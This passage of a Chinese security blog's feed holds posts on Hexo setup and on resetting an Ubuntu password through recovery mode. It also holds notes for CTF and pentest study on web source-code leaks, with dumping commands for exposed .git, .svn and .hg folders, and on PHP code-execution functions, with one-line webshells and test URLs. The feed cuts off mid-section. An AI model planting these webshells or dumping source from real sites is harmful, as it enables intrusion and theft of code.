hexo-generator-feed --save</span><br><span class="line"></span><br><span class="line">sudo npm install hexo-generator-sitemap --save</span><br></pre></td></tr></table></figure><h2 id="本地测试是否安装成功"><a href="#本地测试是否安装成功" class="headerlink" title="本地测试是否安装成功"></a>本地测试是否安装成功</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//先本地预览</span><br><span class="line">hexo clean</span><br><span class="line"></span><br><span class="line">hexo g</span><br><span class="line"></span><br><span class="line">hexo s</span><br><span class="line"></span><br><span class="line">//此时可以先在localhost:4000 本地预览博客，如果不报错，那就说明迁移成功</span><br></pre></td></tr></table></figure><h2 id="部署到github上"><a href="#部署到github上" class="headerlink" title="部署到github上"></a>部署到github上</h2><p>由于迁移的原因，本地的公钥私钥需要重新生存，请参考这篇文章<a href="https://www.jianshu.com/p/63edbb08bd5f" target="_blank" rel="noopener">Mac下Github的SSH公钥生成记录</a></p><p>然后测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 正式部署</span><br><span class="line">hexo clean</span><br><span class="line"></span><br><span class="line">hexo g</span><br><span class="line"></span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;网上也有类似的教程，但是每次都要去上网查询怎么去配置，比较耗时。所以就自己记录下来，方便以后看。&lt;/p&gt;
    
    </summary>
    
      <category term="Blog搭建" scheme="http://0clickjacking0.github.io/categories/Blog%E6%90%AD%E5%BB%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>Ubuntu16.04忘记登录密码的解决办法（虚拟机下处理方法相同）</title>
    <link href="http://0clickjacking0.github.io/2019/04/28/Ubuntu16-04%EF%BC%88%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%89%E5%BF%98%E8%AE%B0%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
    <id>http://0clickjacking0.github.io/2019/04/28/Ubuntu16-04（虚拟机）忘记登录密码的解决办法/</id>
    <published>2019-04-28T08:14:51.000Z</published>
    <updated>2019-05-11T12:52:58.625Z</updated>
    
    <content type="html"><![CDATA[<p>Ubuntu16.04（虚拟机）忘记登录密码的解决办法备忘录，防止下次忘记密码时不知道该怎么办</p><a id="more"></a><h2 id="1-重启ubuntu系统，开机时长按shift按键进入GRUB菜单，选择第二个高级选项。如下图："><a href="#1-重启ubuntu系统，开机时长按shift按键进入GRUB菜单，选择第二个高级选项。如下图：" class="headerlink" title="1. 重启ubuntu系统，开机时长按shift按键进入GRUB菜单，选择第二个高级选项。如下图："></a>1. 重启ubuntu系统，开机时长按shift按键进入GRUB菜单，选择第二个高级选项。如下图：</h2><p><img src="http://images.xianyu123.club/ubuntu_forget_pass1.png?imageslim" alt></p><h2 id="2-在高级选择中选择Recovery-mode模式，如果有多个，选择版本最高的那个，然后进入Recovery-mode模式。键盘按“e”键进入编辑模式。如下图，注意：不要先按enter键"><a href="#2-在高级选择中选择Recovery-mode模式，如果有多个，选择版本最高的那个，然后进入Recovery-mode模式。键盘按“e”键进入编辑模式。如下图，注意：不要先按enter键" class="headerlink" title="2. 在高级选择中选择Recovery mode模式，如果有多个，选择版本最高的那个，然后进入Recovery mode模式。键盘按“e”键进入编辑模式。如下图，注意：不要先按enter键"></a>2. 在高级选择中选择Recovery mode模式，如果有多个，选择版本最高的那个，然后进入Recovery mode模式。键盘按“e”键进入编辑模式。如下图，注意：不要先按enter键</h2><p><img src="http://images.xianyu123.club/ubuntu_forget_pass4.png?imageslim" alt></p><h2 id="3-在编辑模式中通过上下键寻找到RO修改为RW模式-可写入恢复模式-。如下图，然后按crtl-X进入系统"><a href="#3-在编辑模式中通过上下键寻找到RO修改为RW模式-可写入恢复模式-。如下图，然后按crtl-X进入系统" class="headerlink" title="3. 在编辑模式中通过上下键寻找到RO修改为RW模式(可写入恢复模式)。如下图，然后按crtl+X进入系统"></a>3. 在编辑模式中通过上下键寻找到RO修改为RW模式(可写入恢复模式)。如下图，然后按crtl+X进入系统</h2><p><img src="http://images.xianyu123.club/ubuntu_forget_pass2.jpg?imageslim" alt></p><h2 id="4-进行系统BIOS界面，通过上下键选择root命令行，点击enter键，如下图："><a href="#4-进行系统BIOS界面，通过上下键选择root命令行，点击enter键，如下图：" class="headerlink" title="4. 进行系统BIOS界面，通过上下键选择root命令行，点击enter键，如下图："></a>4. 进行系统BIOS界面，通过上下键选择root命令行，点击enter键，如下图：</h2><p><img src="http://images.xianyu123.club/ubuntu_forget_pass5.png?imageslim" alt></p><h2 id="5-然后再按回车，进入shell交互模式，输入命令passwd-username（username为用户，比如我的用户名为xianyu123），然后回车，输入新密码和重复新密码即可"><a href="#5-然后再按回车，进入shell交互模式，输入命令passwd-username（username为用户，比如我的用户名为xianyu123），然后回车，输入新密码和重复新密码即可" class="headerlink" title="5. 然后再按回车，进入shell交互模式，输入命令passwd username（username为用户，比如我的用户名为xianyu123），然后回车，输入新密码和重复新密码即可"></a>5. 然后再按回车，进入shell交互模式，输入命令<code>passwd username</code>（<code>username</code>为用户，比如我的用户名为<code>xianyu123</code>），然后回车，输入新密码和重复新密码即可</h2><p><img src="http://images.xianyu123.club/ubuntu_forget_pass3.jpg?imageslim" alt></p><h2 id="6-输入sudo-reboot，然后就可以使用新密码登录了"><a href="#6-输入sudo-reboot，然后就可以使用新密码登录了" class="headerlink" title="6. 输入sudo reboot，然后就可以使用新密码登录了"></a>6. 输入sudo reboot，然后就可以使用新密码登录了</h2><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.cnblogs.com/cnkemi/p/6066441.html" target="_blank" rel="noopener">Ubuntn系统忘记密码的解决方法（虚拟机下同样处理）</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Ubuntu16.04（虚拟机）忘记登录密码的解决办法备忘录，防止下次忘记密码时不知道该怎么办&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://0clickjacking0.github.io/categories/Linux/"/>
    
    
  </entry>
  
  <entry>
    <title>web常见源码泄露</title>
    <link href="http://0clickjacking0.github.io/2019/04/17/web%E5%B8%B8%E8%A7%81%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
    <id>http://0clickjacking0.github.io/2019/04/17/web常见源码泄露/</id>
    <published>2019-04-17T08:24:02.000Z</published>
    <updated>2019-05-22T02:06:44.182Z</updated>
    
    <content type="html"><![CDATA[<p>web常见源码泄露备忘录</p><a id="more"></a><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>网上已经有非常多的资料了，写本文主要是经常在CTF中和web渗透测试时遇到，所以当作自己的备忘录记录一下</p><h1 id="源码泄漏分类"><a href="#源码泄漏分类" class="headerlink" title="源码泄漏分类"></a>源码泄漏分类</h1><h2 id="hg源码泄漏"><a href="#hg源码泄漏" class="headerlink" title=".hg源码泄漏"></a>.hg源码泄漏</h2><p><code>hg</code>是类似于<code>git</code>的一种分布式管理</p><h3 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h3><p><code>hg init</code>的时候会生成<code>.hg</code>（初始化）</p><h3 id="fuzz："><a href="#fuzz：" class="headerlink" title="fuzz："></a>fuzz：</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://url/.hg/</span></span><br></pre></td></tr></table></figure><h3 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h3><p>工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-hg.pl -v -u http://url/.hg</span><br></pre></td></tr></table></figure><h2 id="git源码泄漏"><a href="#git源码泄漏" class="headerlink" title=".git源码泄漏"></a>.git源码泄漏</h2><h3 id="漏洞成因：-1"><a href="#漏洞成因：-1" class="headerlink" title="漏洞成因："></a>漏洞成因：</h3><p>在运行<code>git init</code>初始化代码库的时候，会在当前目录下面产生一个<code>.git</code>的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把<code>.git</code>这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p><h3 id="fuzz：-1"><a href="#fuzz：-1" class="headerlink" title="fuzz："></a>fuzz：</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://url/.git/config</span></span><br></pre></td></tr></table></figure><p>存在该页面，可以看到配置信息，说明存在该漏洞</p><h3 id="漏洞利用：-1"><a href="#漏洞利用：-1" class="headerlink" title="漏洞利用："></a>漏洞利用：</h3><p>工具：<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">GitHack</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http://url/.git/</span><br></pre></td></tr></table></figure><p>工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-hg.pl -v -u http://url/.git</span><br></pre></td></tr></table></figure><h2 id="DS-Store文件泄漏"><a href="#DS-Store文件泄漏" class="headerlink" title=".DS_Store文件泄漏"></a>.DS_Store文件泄漏</h2><h3 id="漏洞成因：-2"><a href="#漏洞成因：-2" class="headerlink" title="漏洞成因："></a>漏洞成因：</h3><p>在发布代码时未删除文件夹中隐藏的<code>.DS_store</code></p><h3 id="fuzz：-2"><a href="#fuzz：-2" class="headerlink" title="fuzz："></a>fuzz：</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://url/.DS_Store</span></span><br></pre></td></tr></table></figure><h3 id="漏洞利用：-2"><a href="#漏洞利用：-2" class="headerlink" title="漏洞利用："></a>漏洞利用：</h3><p>工具：<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">dsstoreexp</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ds_store_exp.py http://url/.DS_Store</span><br></pre></td></tr></table></figure><h2 id="编辑器文件泄露"><a href="#编辑器文件泄露" class="headerlink" title="编辑器文件泄露"></a>编辑器文件泄露</h2><h3 id="vim文件泄露"><a href="#vim文件泄露" class="headerlink" title="vim文件泄露"></a>vim文件泄露</h3><p>非正常关闭vim编辑器（直接关闭终端、电脑断电等），都会生成一个用于备份缓冲区内容的临时文件<code>.swp</code>文件。它记录了用户在非正常关闭vim编辑器之前未能及时保存的修改，用于文件恢复。并且多次意外退出并不会覆盖旧的<code>.swp</code>文件，而是会生成一个新的，例如<code>.swo</code>文件。</p><p>例如第一次产生一个<code>.test.txt.swp</code>，再次意外退出后，将会产生名为<code>.test.txt.swo</code>的交换文件；而第三次产生的交换文件则为<code>.test.txt.swn</code>依此类推。</p><h3 id="vim备份文件"><a href="#vim备份文件" class="headerlink" title="vim备份文件"></a>vim备份文件</h3><p>默认情况下使用Vim编程，在修改文件后系统会自动生成一个带<code>~</code>的备份文件，某些情况下可以对其下载进行查看</p><p>例如：<br><code>index.php</code>的备份文件则为<code>index.php~</code></p><h3 id="phpstorm"><a href="#phpstorm" class="headerlink" title="phpstorm"></a>phpstorm</h3><p>使用<code>phpstorm</code>新建项目时，会生成一个<code>.idea`</code>文件夹，这个文件夹有一个workspace.xml`，访问可以得到一些信息。</p><h2 id="网站备份压缩文件"><a href="#网站备份压缩文件" class="headerlink" title="网站备份压缩文件"></a>网站备份压缩文件</h2><p>在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</p><p><strong>漏洞成因及危害:</strong></p><p>该漏洞的成因主要有以下两种：</p><ol><li>服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。</li><li>编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。</li></ol><h3 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.rar</span><br><span class="line">.zip</span><br><span class="line">.7z</span><br><span class="line">.tar.gz</span><br><span class="line">.bak</span><br><span class="line">.txt</span><br><span class="line">.html</span><br></pre></td></tr></table></figure><h2 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h2><h3 id="fuzz：-3"><a href="#fuzz：-3" class="headerlink" title="fuzz："></a>fuzz：</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://url/.svn/entries</span></span><br></pre></td></tr></table></figure><h3 id="漏洞利用：-3"><a href="#漏洞利用：-3" class="headerlink" title="漏洞利用："></a>漏洞利用：</h3><p>工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-svn.pl -v -u http://www.example.com/.svn/</span><br></pre></td></tr></table></figure><h2 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h2><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过<code>web.xml</code>文件对要访问的文件进行相应映射才能访问。</p><h3 id="漏洞成因：-3"><a href="#漏洞成因：-3" class="headerlink" title="漏洞成因："></a>漏洞成因：</h3><p>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致<code>web.xml</code>等文件能够被读取。</p><h3 id="WEB-INF主要包含一下文件或目录："><a href="#WEB-INF主要包含一下文件或目录：" class="headerlink" title="WEB-INF主要包含一下文件或目录："></a>WEB-INF主要包含一下文件或目录：</h3><ul><li><code>/WEB-INF/web.xml</code>：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</li><li><code>/WEB-INF/classes/</code>：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</li><li><code>/WEB-INF/lib/</code>：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</li><li><code>/WEB-INF/src/</code>：源码目录，按照包名结构放置各个java文件。</li><li><code>/WEB-INF/database.properties</code>：数据库配置文件</li></ul><h3 id="漏洞利用：-4"><a href="#漏洞利用：-4" class="headerlink" title="漏洞利用："></a>漏洞利用：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://url/WEB-INF/web.xml</span><br></pre></td></tr></table></figure><p>浏览器直接读取，推断<code>class</code>文件的路径，最后直接<code>class</code>文件，在通过反编译<code>class</code>文件，得到网站源码。一般情况，<code>jsp</code>引擎默认都是禁止访问<code>WEB-INF</code>目录的</p><h2 id="CVS泄漏"><a href="#CVS泄漏" class="headerlink" title="CVS泄漏"></a>CVS泄漏</h2><h3 id="fuzz-1"><a href="#fuzz-1" class="headerlink" title="fuzz"></a>fuzz</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://url/CVS/Root 返回根信息</span><br><span class="line"></span><br><span class="line">http://url/CVS/Entries 返回所有文件的结构</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>取回源码的命令，这个命令的意思就是把远端一个名为name的repo clone到本地名为dir的目录下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bk clone http://url/name dir</span><br></pre></td></tr></table></figure><p>查看所有的改变的命令，转到download的目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bk changes</span><br></pre></td></tr></table></figure><h2 id="Bazaar-bzr"><a href="#Bazaar-bzr" class="headerlink" title="Bazaar/bzr"></a>Bazaar/bzr</h2><h3 id="漏洞利用：-5"><a href="#漏洞利用：-5" class="headerlink" title="漏洞利用："></a>漏洞利用：</h3><p>工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-bzr.pl -v -u http://url/.bzr/</span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://zhuanlan.zhihu.com/p/21296806" target="_blank" rel="noopener">文件泄露</a></p><p><a href="http://www.s2.sshz.org/post/source-code-leak/" target="_blank" rel="noopener">常见Web源码泄露解析</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;web常见源码泄露备忘录&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>php代码执行与命令执行漏洞</title>
    <link href="http://0clickjacking0.github.io/2019/04/15/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://0clickjacking0.github.io/2019/04/15/php代码执行与命令执行漏洞/</id>
    <published>2019-04-15T13:17:12.000Z</published>
    <updated>2019-11-27T11:49:14.649Z</updated>
    
    <content type="html"><![CDATA[<p>php代码执行与命令执行漏洞</p><p>学习php代码执行与命令执行漏洞，没有新姿势</p><a id="more"></a><h1 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h1><h2 id="php代码执行相关"><a href="#php代码执行相关" class="headerlink" title="php代码执行相关"></a>php代码执行相关</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed <span class="keyword">eval</span>( string $code)</span><br></pre></td></tr></table></figure><p><code>eval()</code>函数把字符串按照php代码来计算，常见的一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/test.php?cmd=phpinfo();</span><br></pre></td></tr></table></figure><p>得到phpinfo()页面。</p><h3 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h3><p>php5：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool assert( mixed $assertion[, string $description] )</span><br></pre></td></tr></table></figure><p>php7：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool assert( mixed $assertion[, Throwable $exception] )</span><br></pre></td></tr></table></figure><p><strong>assert()</strong> 会检查指定的    <code>assertion</code> 并在结果为 <strong>FALSE</strong> 时采取适当的行动。</p><p>如果 <code>assertion</code> 是字符串，它将会被 <strong>assert()</strong> 当做 PHP 代码来执行。</p><p>普通调用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> assert($_GET[<span class="string">'cmd'</span>]); <span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span> assert($_POST[<span class="string">'cmd'</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/test.php?cmd=phpinfo();</span><br></pre></td></tr></table></figure><p><code>phpinfo()</code>后可以不用分号，得到phpinfo页面。</p><p>assert函数支持动态调用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">'assert'</span>;</span><br><span class="line">$a($_POST[<span class="string">'a'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>php官方在php7中更改了assert函数。在php7.0.29之后的版本不支持动态调用。</strong></p><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace( mixed $pattern, mixed $replacement, mixed $subject[, int $limit = <span class="number">-1</span>[, int &amp;$count]] )</span><br></pre></td></tr></table></figure><p><code>preg_replace()</code>在进行了对替换字符串的后向引用替换之后, 将替换后的字符串作为php代码评估执行(<code>eval</code>函数方式)，并使用执行结果作为实际参与替换的字符串。单引号、双引号、反斜线()和 NULL 字符在后向引用替换时会被用反斜线转义.</p><h4 id="第一个参数"><a href="#第一个参数" class="headerlink" title="第一个参数"></a>第一个参数</h4><!--还没写过，有空补充--><h4 id="第二个参数"><a href="#第二个参数" class="headerlink" title="第二个参数"></a>第二个参数</h4><p>一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@preg_replace(<span class="string">"/123/e"</span>,$_REQUEST[<span class="string">'cmd'</span>],<span class="string">"1234"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/test.php?cmd=phpinfo();</span><br></pre></td></tr></table></figure><p>php 7.0.0  不再支持  <em>/e</em>修饰符</p><p>更详细说明请参考文档：<a href="http://php.net/preg_replace" target="_blank" rel="noopener">php-preg_replace</a></p><h4 id="第三个参数"><a href="#第三个参数" class="headerlink" title="第三个参数"></a>第三个参数</h4><!--还没写过，有空补充--><h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string create_function( string $args, string $code)</span><br></pre></td></tr></table></figure><p>用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">'$fname'</span>,<span class="string">'echo $fname."Zhang"'</span>)</span><br></pre></td></tr></table></figure><p>类似于：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fT</span><span class="params">($fname)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> $fname.<span class="string">"Zhang"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数的内部实现用到了<code>eval</code>，所以也具有相同的安全问题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line">$b = create_function(<span class="string">'$a'</span>,<span class="string">"echo $a"</span>);</span><br><span class="line">$b();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/test.php?cmd=phpinfo();</span><br></pre></td></tr></table></figure><p>该函数存在缺陷，详见<a href="https://blog.51cto.com/lovexm/1743442" target="_blank" rel="noopener">PHP create_function()代码注入</a></p><h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed call_user_func( callable $callback[, mixed $parameter[, mixed $...]] )</span><br></pre></td></tr></table></figure><p>第一个参数<code>callback</code>是被调用的回调函数，其余参数是回调函数的参数。 传入<code>call_user_func()</code>的参数不能为引用传递。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">call_user_func($_GET[<span class="string">'fun'</span>],$_GET[<span class="string">'exec'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/test.php?fun=assert&amp;exec=phpinfo()</span><br></pre></td></tr></table></figure><p><code>eval()</code>在这里是不能作为回调函数使用的。</p><p>在php中，可以通过<code>is_callable</code>来判断一个函数是否为回调函数，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> is_callable(<span class="string">"eval"</span>) == <span class="keyword">false</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed call_user_func_array( callable $callback, <span class="keyword">array</span> $param_arr)</span><br></pre></td></tr></table></figure><p> 把第一个参数作为回调函数（<code>callback</code>）调用，把参数数组作（<code>param_arr</code>）为回调函数的的参数传入。 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">call_user_func_array($_GET[<span class="string">'fun'</span>],$_GET[<span class="string">'exec'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/test.php?fun=assert&amp;exec[]=phpinfo()</span><br></pre></td></tr></table></figure><h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span> array_map( callable $callback, <span class="keyword">array</span> $array1[, <span class="keyword">array</span> $...] )</span><br></pre></td></tr></table></figure><p>返回数组，是为 <code>array1</code> 每个元素应用 <code>callback</code>函数之后的数组。<code>callback</code> 函数形参的数量和传给 <strong>array_map()</strong> 数组数量，两者必须一样。 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line">$b = $_GET[<span class="string">'b'</span>];</span><br><span class="line">$array[<span class="number">0</span>] = $b;</span><br><span class="line">$c = array_map($a,$array);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/test1.php?a=assert&amp;b=phpinfo();</span><br></pre></td></tr></table></figure><h2 id="系统命令执行相关"><a href="#系统命令执行相关" class="headerlink" title="系统命令执行相关"></a>系统命令执行相关</h2><h3 